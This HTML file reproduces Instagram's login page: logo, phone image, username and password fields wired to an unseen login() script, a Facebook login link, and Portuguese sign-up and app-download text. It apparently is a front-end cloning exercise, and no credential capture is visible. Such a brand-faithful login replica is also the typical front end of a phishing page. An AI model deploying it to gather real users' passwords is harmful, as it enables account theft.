<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="images/instagram_favicon.png" type="image/x-icon">
</head>
<body>
    <div class="instagram-wrapper">
        <div class="instagram-phone">
            <img src="images/iphone.png" alt="iphone">
        </div>
        <div class="instagram-continue">
            <div class="group">
                <img src="images/instagram-logo-1.png" alt="instagram logo" class="instagram-logo">
                <!-- <div class="profile-photo">
                    <img src="images/emanuel.jpg" alt="foto do perfil">
                </div> -->
                <input type="text"class="login" placeholder="Phone number, username, or email" aria-required="true" id="login">
                <input type="password" class="login" placeholder="Password" aria-required="true" id="password">
                <input type="button" value="Log In" class="instagram-login" onclick="login()">
                <div class="line">
                    <p>
                        <hr>
                        <span>OR</span>
                        <hr>
                    </p>
                </div>
                <div class="facebook-login">
                    <img src="images/facebook.png" alt="Facebook logo">
                    <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25229b886w12ccdq91f66t8w1amdsic1neitywuj9kslb01vbcym1r1c%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D464d5422-4dec-4d20-a032-52410cf25e11%26shared_id%3DTODO_SHARED_ID%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25229b886w12ccdq91f66t8w1amdsic1neitywuj9kslb01vbcym1r1c%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=en_US&pl_dbl=0">Login in with facebook</a>
                </div>
                <div class="password">
                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot your password?</a>
                </div>
                <div id="res">
                    
                </div>
                
            </div>
            <div class="group">
                <p class="not-account">
                    <span>NÃ£o tem uma conta?</span>
                    <a href="https://www.instagram.com/accounts/emailsignup/"><span class="link-blue">Inscreva-se</span></a>
                    
                </p>
            </div>
            <div class="get-the-app">
                <p class="get-app">Baixe o Aplicativo</p>
                <div class="download">
                    <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo" target="_blank" class="app-download"></a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D69A9DAE0-11FD-4573-92A2-B13CF07C8735%26utm_content%3Dlo%26utm_medium%3Dbadge" target="_blank" class="app-download"></a>
                </div>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
